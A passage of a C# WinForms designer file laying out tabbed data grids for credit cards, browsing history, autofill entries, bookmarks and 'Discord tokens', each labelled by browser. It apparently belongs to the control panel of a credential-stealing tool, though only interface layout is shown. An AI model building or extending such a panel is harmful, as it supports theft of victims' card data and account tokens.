        this.ListCreditCards.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListCreditCards.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListCreditCards.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListCreditCards.ThemeStyle.HeaderStyle.Height = 30;
        this.ListCreditCards.ThemeStyle.ReadOnly = true;
        this.ListCreditCards.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListCreditCards.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListCreditCards.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListCreditCards.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListCreditCards.ThemeStyle.RowsStyle.Height = 22;
        this.ListCreditCards.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListCreditCards.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn3.HeaderText = "";
        this.dataGridViewImageColumn3.Name = "dataGridViewImageColumn3";
        this.dataGridViewImageColumn3.ReadOnly = true;
        this.dataGridViewImageColumn3.Width = 5;
        this.dataGridViewTextBoxColumn6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn6.HeaderText = "Browser";
        this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
        this.dataGridViewTextBoxColumn6.ReadOnly = true;
        this.dataGridViewTextBoxColumn6.Width = 81;
        this.dataGridViewTextBoxColumn7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn7.DefaultCellStyle = dataGridViewCellStyle12;
        this.dataGridViewTextBoxColumn7.HeaderText = "Type";
        this.dataGridViewTextBoxColumn7.Name = "dataGridViewTextBoxColumn7";
        this.dataGridViewTextBoxColumn7.ReadOnly = true;
        this.dataGridViewTextBoxColumn7.Width = 60;
        this.dataGridViewTextBoxColumn8.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn8.HeaderText = "Number";
        this.dataGridViewTextBoxColumn8.Name = "dataGridViewTextBoxColumn8";
        this.dataGridViewTextBoxColumn8.ReadOnly = true;
        this.dataGridViewTextBoxColumn8.Width = 82;
        this.dataGridViewTextBoxColumn9.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn9.HeaderText = "Expiry date";
        this.dataGridViewTextBoxColumn9.Name = "dataGridViewTextBoxColumn9";
        this.dataGridViewTextBoxColumn9.ReadOnly = true;
        this.dataGridViewTextBoxColumn9.Width = 99;
        this.dataGridViewTextBoxColumn10.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn10.HeaderText = "Name";
        this.dataGridViewTextBoxColumn10.Name = "dataGridViewTextBoxColumn10";
        this.dataGridViewTextBoxColumn10.ReadOnly = true;
        this.dataGridViewTextBoxColumn10.Width = 68;
        this.PageHistory.Controls.Add(this.ListHostiry);
        this.PageHistory.Location = new System.Drawing.Point(4, 4);
        this.PageHistory.Name = "PageHistory";
        this.PageHistory.Size = new System.Drawing.Size(698, 379);
        this.PageHistory.TabIndex = 3;
        this.PageHistory.Text = "History";
        this.PageHistory.UseVisualStyleBackColor = true;
        this.ListHostiry.AllowUserToAddRows = false;
        this.ListHostiry.AllowUserToDeleteRows = false;
        this.ListHostiry.AllowUserToResizeColumns = false;
        this.ListHostiry.AllowUserToResizeRows = false;
        dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListHostiry.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle13;
        this.ListHostiry.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListHostiry.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListHostiry.BackgroundColor = System.Drawing.Color.White;
        this.ListHostiry.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListHostiry.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListHostiry.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListHostiry.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle14.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListHostiry.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle14;
        this.ListHostiry.ColumnHeadersHeight = 30;
        this.ListHostiry.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListHostiry.Columns.AddRange(this.dataGridViewImageColumn4, this.dataGridViewTextBoxColumn11, this.dataGridViewTextBoxColumn12, this.Column8, this.Column9);
        this.ListHostiry.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle15.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle15.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle15.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle15.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListHostiry.DefaultCellStyle = dataGridViewCellStyle15;
        this.ListHostiry.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListHostiry.EnableHeadersVisualStyles = false;
        this.ListHostiry.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListHostiry.Location = new System.Drawing.Point(0, 0);
        this.ListHostiry.Name = "ListHostiry";
        this.ListHostiry.ReadOnly = true;
        this.ListHostiry.RowHeadersVisible = false;
        this.ListHostiry.RowHeadersWidth = 27;
        this.ListHostiry.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListHostiry.ShowCellErrors = false;
        this.ListHostiry.ShowEditingIcon = false;
        this.ListHostiry.ShowRowErrors = false;
        this.ListHostiry.Size = new System.Drawing.Size(698, 379);
        this.ListHostiry.TabIndex = 663;
        this.ListHostiry.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListHostiry.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListHostiry.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListHostiry.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListHostiry.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListHostiry.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListHostiry.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListHostiry.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListHostiry.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListHostiry.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListHostiry.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListHostiry.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListHostiry.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListHostiry.ThemeStyle.HeaderStyle.Height = 30;
        this.ListHostiry.ThemeStyle.ReadOnly = true;
        this.ListHostiry.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListHostiry.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListHostiry.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListHostiry.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListHostiry.ThemeStyle.RowsStyle.Height = 22;
        this.ListHostiry.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListHostiry.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn4.HeaderText = "";
        this.dataGridViewImageColumn4.Name = "dataGridViewImageColumn4";
        this.dataGridViewImageColumn4.ReadOnly = true;
        this.dataGridViewImageColumn4.Width = 5;
        this.dataGridViewTextBoxColumn11.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn11.HeaderText = "Browser";
        this.dataGridViewTextBoxColumn11.Name = "dataGridViewTextBoxColumn11";
        this.dataGridViewTextBoxColumn11.ReadOnly = true;
        this.dataGridViewTextBoxColumn11.Width = 81;
        this.dataGridViewTextBoxColumn12.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn12.DefaultCellStyle = dataGridViewCellStyle16;
        this.dataGridViewTextBoxColumn12.HeaderText = "Title";
        this.dataGridViewTextBoxColumn12.Name = "dataGridViewTextBoxColumn12";
        this.dataGridViewTextBoxColumn12.ReadOnly = true;
        this.dataGridViewTextBoxColumn12.Width = 57;
        this.Column8.HeaderText = "URL";
        this.Column8.Name = "Column8";
        this.Column8.ReadOnly = true;
        this.Column8.Width = 57;
        this.Column9.HeaderText = "Count";
        this.Column9.Name = "Column9";
        this.Column9.ReadOnly = true;
        this.Column9.Width = 70;
        this.PageAutoFill.Controls.Add(this.ListAutoFiles);
        this.PageAutoFill.Location = new System.Drawing.Point(4, 4);
        this.PageAutoFill.Name = "PageAutoFill";
        this.PageAutoFill.Size = new System.Drawing.Size(698, 379);
        this.PageAutoFill.TabIndex = 5;
        this.PageAutoFill.Text = "AutoFill";
        this.PageAutoFill.UseVisualStyleBackColor = true;
        this.ListAutoFiles.AllowUserToAddRows = false;
        this.ListAutoFiles.AllowUserToDeleteRows = false;
        this.ListAutoFiles.AllowUserToResizeColumns = false;
        this.ListAutoFiles.AllowUserToResizeRows = false;
        dataGridViewCellStyle17.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListAutoFiles.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle17;
        this.ListAutoFiles.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListAutoFiles.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListAutoFiles.BackgroundColor = System.Drawing.Color.White;
        this.ListAutoFiles.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListAutoFiles.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListAutoFiles.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListAutoFiles.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle18.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle18.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle18.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle18.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListAutoFiles.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle18;
        this.ListAutoFiles.ColumnHeadersHeight = 30;
        this.ListAutoFiles.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListAutoFiles.Columns.AddRange(this.dataGridViewImageColumn5, this.dataGridViewTextBoxColumn13, this.dataGridViewTextBoxColumn14, this.dataGridViewTextBoxColumn15);
        this.ListAutoFiles.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle19.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle19.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle19.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListAutoFiles.DefaultCellStyle = dataGridViewCellStyle19;
        this.ListAutoFiles.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListAutoFiles.EnableHeadersVisualStyles = false;
        this.ListAutoFiles.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListAutoFiles.Location = new System.Drawing.Point(0, 0);
        this.ListAutoFiles.Name = "ListAutoFiles";
        this.ListAutoFiles.ReadOnly = true;
        this.ListAutoFiles.RowHeadersVisible = false;
        this.ListAutoFiles.RowHeadersWidth = 27;
        this.ListAutoFiles.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListAutoFiles.ShowCellErrors = false;
        this.ListAutoFiles.ShowEditingIcon = false;
        this.ListAutoFiles.ShowRowErrors = false;
        this.ListAutoFiles.Size = new System.Drawing.Size(698, 379);
        this.ListAutoFiles.TabIndex = 664;
        this.ListAutoFiles.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListAutoFiles.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListAutoFiles.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListAutoFiles.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListAutoFiles.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListAutoFiles.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListAutoFiles.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListAutoFiles.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListAutoFiles.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListAutoFiles.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListAutoFiles.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListAutoFiles.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListAutoFiles.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListAutoFiles.ThemeStyle.HeaderStyle.Height = 30;
        this.ListAutoFiles.ThemeStyle.ReadOnly = true;
        this.ListAutoFiles.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListAutoFiles.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListAutoFiles.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListAutoFiles.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListAutoFiles.ThemeStyle.RowsStyle.Height = 22;
        this.ListAutoFiles.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListAutoFiles.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn5.HeaderText = "";
        this.dataGridViewImageColumn5.Name = "dataGridViewImageColumn5";
        this.dataGridViewImageColumn5.ReadOnly = true;
        this.dataGridViewImageColumn5.Width = 5;
        this.dataGridViewTextBoxColumn13.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn13.HeaderText = "Browser";
        this.dataGridViewTextBoxColumn13.Name = "dataGridViewTextBoxColumn13";
        this.dataGridViewTextBoxColumn13.ReadOnly = true;
        this.dataGridViewTextBoxColumn13.Width = 81;
        this.dataGridViewTextBoxColumn14.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn14.DefaultCellStyle = dataGridViewCellStyle20;
        this.dataGridViewTextBoxColumn14.HeaderText = "Name";
        this.dataGridViewTextBoxColumn14.Name = "dataGridViewTextBoxColumn14";
        this.dataGridViewTextBoxColumn14.ReadOnly = true;
        this.dataGridViewTextBoxColumn14.Width = 68;
        this.dataGridViewTextBoxColumn15.HeaderText = "Value";
        this.dataGridViewTextBoxColumn15.Name = "dataGridViewTextBoxColumn15";
        this.dataGridViewTextBoxColumn15.ReadOnly = true;
        this.dataGridViewTextBoxColumn15.Width = 65;
        this.PageBookmarks.Controls.Add(this.ListMarket);
        this.PageBookmarks.Location = new System.Drawing.Point(4, 4);
        this.PageBookmarks.Name = "PageBookmarks";
        this.PageBookmarks.Size = new System.Drawing.Size(698, 379);
        this.PageBookmarks.TabIndex = 6;
        this.PageBookmarks.Text = "Bookmarks";
        this.PageBookmarks.UseVisualStyleBackColor = true;
        this.ListMarket.AllowUserToAddRows = false;
        this.ListMarket.AllowUserToDeleteRows = false;
        this.ListMarket.AllowUserToResizeColumns = false;
        this.ListMarket.AllowUserToResizeRows = false;
        dataGridViewCellStyle21.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListMarket.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle21;
        this.ListMarket.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListMarket.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListMarket.BackgroundColor = System.Drawing.Color.White;
        this.ListMarket.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListMarket.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListMarket.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListMarket.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle22.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle22.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle22.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle22.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle22.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle22.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle22.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListMarket.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle22;
        this.ListMarket.ColumnHeadersHeight = 30;
        this.ListMarket.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListMarket.Columns.AddRange(this.dataGridViewImageColumn6, this.dataGridViewTextBoxColumn16, this.dataGridViewTextBoxColumn17, this.dataGridViewTextBoxColumn18);
        this.ListMarket.ContextMenuStrip = this.ContexPasswords;
        dataGridViewCellStyle23.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle23.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle23.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle23.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle23.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle23.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle23.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListMarket.DefaultCellStyle = dataGridViewCellStyle23;
        this.ListMarket.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListMarket.EnableHeadersVisualStyles = false;
        this.ListMarket.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListMarket.Location = new System.Drawing.Point(0, 0);
        this.ListMarket.Name = "ListMarket";
        this.ListMarket.ReadOnly = true;
        this.ListMarket.RowHeadersVisible = false;
        this.ListMarket.RowHeadersWidth = 27;
        this.ListMarket.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListMarket.ShowCellErrors = false;
        this.ListMarket.ShowEditingIcon = false;
        this.ListMarket.ShowRowErrors = false;
        this.ListMarket.Size = new System.Drawing.Size(698, 379);
        this.ListMarket.TabIndex = 665;
        this.ListMarket.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListMarket.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListMarket.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListMarket.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListMarket.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListMarket.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListMarket.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListMarket.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListMarket.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListMarket.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListMarket.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListMarket.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListMarket.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListMarket.ThemeStyle.HeaderStyle.Height = 30;
        this.ListMarket.ThemeStyle.ReadOnly = true;
        this.ListMarket.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListMarket.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListMarket.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListMarket.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListMarket.ThemeStyle.RowsStyle.Height = 22;
        this.ListMarket.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListMarket.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn6.HeaderText = "";
        this.dataGridViewImageColumn6.Name = "dataGridViewImageColumn6";
        this.dataGridViewImageColumn6.ReadOnly = true;
        this.dataGridViewImageColumn6.Width = 5;
        this.dataGridViewTextBoxColumn16.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn16.HeaderText = "Browser";
        this.dataGridViewTextBoxColumn16.Name = "dataGridViewTextBoxColumn16";
        this.dataGridViewTextBoxColumn16.ReadOnly = true;
        this.dataGridViewTextBoxColumn16.Width = 81;
        this.dataGridViewTextBoxColumn17.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle24.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn17.DefaultCellStyle = dataGridViewCellStyle24;
        this.dataGridViewTextBoxColumn17.HeaderText = "Title";
        this.dataGridViewTextBoxColumn17.Name = "dataGridViewTextBoxColumn17";
        this.dataGridViewTextBoxColumn17.ReadOnly = true;
        this.dataGridViewTextBoxColumn17.Width = 57;
        this.dataGridViewTextBoxColumn18.HeaderText = "URL";
        this.dataGridViewTextBoxColumn18.Name = "dataGridViewTextBoxColumn18";
        this.dataGridViewTextBoxColumn18.ReadOnly = true;
        this.dataGridViewTextBoxColumn18.Width = 57;
        this.PageDiscord.Controls.Add(this.ListDiscord);
        this.PageDiscord.Location = new System.Drawing.Point(4, 4);
        this.PageDiscord.Name = "PageDiscord";
        this.PageDiscord.Size = new System.Drawing.Size(698, 379);
        this.PageDiscord.TabIndex = 7;
        this.PageDiscord.Text = "Discord tokens";
        this.PageDiscord.UseVisualStyleBackColor = true;
        this.ListDiscord.AllowUserToAddRows = false;
        this.ListDiscord.AllowUserToDeleteRows = false;
        this.ListDiscord.AllowUserToResizeColumns = false;
        this.ListDiscord.AllowUserToResizeRows = false;
        dataGridViewCellStyle25.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListDiscord.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle25;
        this.ListDiscord.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListDiscord.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListDiscord.BackgroundColor = System.Drawing.Color.White;
        this.ListDiscord.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListDiscord.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListDiscord.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListDiscord.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle26.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle26.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle26.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle26.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle26.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle26.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle26.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListDiscord.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle26;
        this.ListDiscord.ColumnHeadersHeight = 30;
        this.ListDiscord.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListDiscord.Columns.AddRange(this.dataGridViewImageColumn7, this.dataGridViewTextBoxColumn19);
        this.ListDiscord.ContextMenuStrip = this.ContexDiscord;
        dataGridViewCellStyle27.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle27.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle27.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle27.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle27.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle27.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle27.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListDiscord.DefaultCellStyle = dataGridViewCellStyle27;
        this.ListDiscord.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListDiscord.EnableHeadersVisualStyles = false;
        this.ListDiscord.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListDiscord.Location = new System.Drawing.Point(0, 0);
        this.ListDiscord.Name = "ListDiscord";
        this.ListDiscord.ReadOnly = true;
        this.ListDiscord.RowHeadersVisible = false;
        this.ListDiscord.RowHeadersWidth = 27;
        this.ListDiscord.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListDiscord.ShowCellErrors = false;
        this.ListDiscord.ShowEditingIcon = false;
        this.ListDiscord.ShowRowErrors = false;
        this.ListDiscord.Size = new System.Drawing.Size(698, 379);
